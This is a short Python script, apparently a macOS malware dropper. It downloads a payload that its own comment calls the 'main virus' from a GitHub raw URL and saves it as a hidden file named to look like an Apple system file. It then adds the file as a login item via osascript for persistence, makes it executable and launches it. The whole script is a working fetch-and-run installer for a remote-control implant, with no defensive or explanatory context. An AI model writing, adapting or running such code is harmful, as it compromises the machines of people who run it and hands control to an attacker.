from requests import get
from os.path import expanduser
from os import remove
from subprocess import Popen as subproc
from os import system, chmod

filename = "com.apple.com.user.core"
localfile = f"{expanduser('~')}/.{filename}"

# download main virus
open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/Remote-Control-With-Evernote/main/main", allow_redirects=True).content)

system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{expanduser('~')}/.{filename}\", hidden:false}}' > /dev/null")
chmod(localfile, 755)

subproc([localfile])
